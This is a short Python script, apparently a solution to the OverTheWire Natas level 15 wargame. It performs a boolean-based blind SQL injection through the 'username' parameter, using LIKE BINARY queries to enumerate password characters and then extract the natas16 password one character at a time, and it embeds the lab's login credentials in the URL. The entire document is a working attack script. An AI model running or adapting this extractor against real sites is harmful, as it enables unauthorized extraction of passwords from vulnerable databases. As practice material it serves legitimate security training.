
import requests
 
possiblechars="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
sqliAttack="http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/"
userExist = 'This user exists.'
validCharsinPassword=''
password=''

r=requests.get(sqliAttack)
print("Starting attack")

for c in possiblechars:
	r=requests.get(sqliAttack+'?username=natas16" and password LIKE BINARY "%'+c+'%" "')
	
	if(r.content.find(userExist)!=-1):
		validCharsinPassword+=c
		print 'valid chars:' + validCharsinPassword

# Assuming password is 32 characters long
for i in range(32):
	for c in validCharsinPassword:
		r=requests.get(sqliAttack+'?username=natas16" and password LIKE BINARY "'+password+c+'%" "')
		if(r.content.find(userExist)!=-1):
			password+=c
			print 'password:' + password
			break;
	
